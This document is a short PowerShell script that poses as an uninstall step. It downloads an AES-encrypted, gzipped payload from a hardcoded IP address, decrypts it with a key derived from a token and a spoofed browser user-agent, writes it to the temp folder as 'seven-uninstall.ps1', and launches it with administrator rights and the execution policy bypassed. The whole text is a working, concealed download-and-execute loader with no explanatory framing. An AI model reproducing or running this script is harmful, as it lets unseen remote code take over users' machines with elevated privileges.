$ErrorActionPreference = 'Stop'
$B = 'http://145.239.65.119:20184'; $T = 'tk-48232543-a9d6F'
$U = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1.19041.1'
$s = [Security.Cryptography.SHA256]::Create()
$k = $s.ComputeHash([Text.Encoding]::UTF8.GetBytes("$T|$U"))
$v = $s.ComputeHash([Text.Encoding]::UTF8.GetBytes("$T|$U|iv"))[0..15]
$a = [Security.Cryptography.Aes]::Create(); $a.Mode = 'CBC'; $a.Padding = 'PKCS7'; $a.Key = $k; $a.IV = $v
$c = New-Object Net.WebClient; $c.Headers.Add('User-Agent', $U)
$d = $c.DownloadData("$B/s/$T/uninstall")
$p = $a.CreateDecryptor().TransformFinalBlock($d, 0, $d.Length)
$m = New-Object IO.MemoryStream; $m.Write($p, 0, $p.Length); $m.Position = 0
$g = New-Object IO.Compression.GZipStream($m, [IO.Compression.CompressionMode]::Decompress)
$o = New-Object IO.MemoryStream; $g.CopyTo($o); $g.Dispose()
$f = Join-Path $env:TEMP 'seven-uninstall.ps1'
[IO.File]::WriteAllBytes($f, $o.ToArray())
Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$f`""
